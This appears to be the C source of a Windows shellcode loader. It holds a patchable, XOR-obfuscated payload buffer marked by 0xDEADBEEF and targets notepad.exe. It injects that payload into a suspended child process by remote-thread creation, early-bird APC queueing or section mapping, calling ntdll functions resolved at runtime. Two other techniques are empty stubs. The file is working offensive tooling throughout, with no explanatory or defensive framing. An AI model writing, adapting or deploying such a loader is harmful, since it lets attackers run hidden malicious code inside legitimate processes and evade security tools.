#include <windows.h>
#include <winternl.h>

#define PAYLOAD_MARKER 0xDEADBEEF
#define MAX_PAYLOAD_SIZE 8192
#define MAX_PROCESS_NAME 256

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

#pragma pack(push, 1)
typedef struct {
	DWORD payload_size;
	unsigned char payload[MAX_PAYLOAD_SIZE];
	unsigned char xor_key;
	unsigned char technique;
	char target_process[MAX_PROCESS_NAME];
} PatchData;
#pragma pack(pop)

PatchData patch_data = {
	PAYLOAD_MARKER,
	{0},
	0,
	0,
	"notepad.exe"
};

void decrypt_payload() {
	DWORD i;
	if (patch_data.xor_key != 0) {
		for (i = 0; i < patch_data.payload_size; i++) {
			patch_data.payload[i] ^= patch_data.xor_key;
		}
	}
}

void inject_create_remote_thread() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf = NULL;
	SIZE_T region_size;
	HANDLE hThread;
	DWORD old;
	HMODULE hNtdll;
	pNtAllocateVirtualMemory NtAllocateVirtualMemory;
	pNtWriteVirtualMemory NtWriteVirtualMemory;
	pNtProtectVirtualMemory NtProtectVirtualMemory;
	pNtCreateThreadEx NtCreateThreadEx;
	char cmd[MAX_PROCESS_NAME];

	region_size = patch_data.payload_size;

	hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		return;
	}

	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {
		return;
	}

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	if (NtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtWriteVirtualMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, buf, NULL, FALSE, 0, 0, 0, NULL) == 0) {
		CloseHandle(hThread);
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_early_bird_apc() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf = NULL;
	SIZE_T region_size;
	DWORD old;
	HMODULE hNtdll;
	pNtAllocateVirtualMemory NtAllocateVirtualMemory;
	pNtWriteVirtualMemory NtWriteVirtualMemory;
	pNtProtectVirtualMemory NtProtectVirtualMemory;
	pNtQueueApcThread NtQueueApcThread;
	char cmd[MAX_PROCESS_NAME];

	region_size = patch_data.payload_size;

	hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		return;
	}

	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");

	if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtQueueApcThread) {
		return;
	}

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	if (NtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtWriteVirtualMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtQueueApcThread(pi.hThread, buf, NULL, NULL, NULL) != 0) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_thread_hijacking() {

}

void inject_process_hollowing() {

}

void inject_remote_mapping() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	HANDLE hSection = NULL;
	LPVOID local_view = NULL;
	LPVOID remote_view = NULL;
	SIZE_T view_size = 0;
	LARGE_INTEGER section_size;
	HANDLE hThread;
	HMODULE hNtdll;
	pNtCreateSection NtCreateSection;
	pNtMapViewOfSection NtMapViewOfSection;
	pNtUnmapViewOfSection NtUnmapViewOfSection;
	pNtCreateThreadEx NtCreateThreadEx;
	char cmd[MAX_PROCESS_NAME];

	section_size.QuadPart = patch_data.payload_size;

	hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		return;
	}

	NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection || !NtCreateThreadEx) {
		return;
	}

	if (NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0) {
		return;
	}

	view_size = patch_data.payload_size;
	if (NtMapViewOfSection(hSection, GetCurrentProcess(), &local_view, 0, 0, NULL, &view_size, 1, 0, PAGE_READWRITE) != 0) {
		CloseHandle(hSection);
		return;
	}

	memcpy(local_view, patch_data.payload, patch_data.payload_size);

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		NtUnmapViewOfSection(GetCurrentProcess(), local_view);
		CloseHandle(hSection);
		return;
	}

	view_size = 0;
	if (NtMapViewOfSection(hSection, pi.hProcess, &remote_view, 0, 0, NULL, &view_size, 1, 0, PAGE_EXECUTE_READ) != 0) {
		NtUnmapViewOfSection(GetCurrentProcess(), local_view);
		CloseHandle(hSection);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, remote_view, NULL, FALSE, 0, 0, 0, NULL) == 0) {
		CloseHandle(hThread);
	}

	ResumeThread(pi.hThread);
	NtUnmapViewOfSection(GetCurrentProcess(), local_view);
	CloseHandle(hSection);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

typedef void (*InjectionFunc)();

InjectionFunc injection_techniques[] = {
	inject_create_remote_thread,
	inject_early_bird_apc,
	inject_thread_hijacking,
	inject_process_hollowing,
	inject_remote_mapping
};

int main() {
	if (patch_data.payload_size == 0 || patch_data.payload_size == PAYLOAD_MARKER || patch_data.payload_size > MAX_PAYLOAD_SIZE) {
		return 1;
	}

	if (patch_data.technique >= 5) {
		return 1;
	}

	decrypt_payload();
	injection_techniques[patch_data.technique]();
	return 0;
}
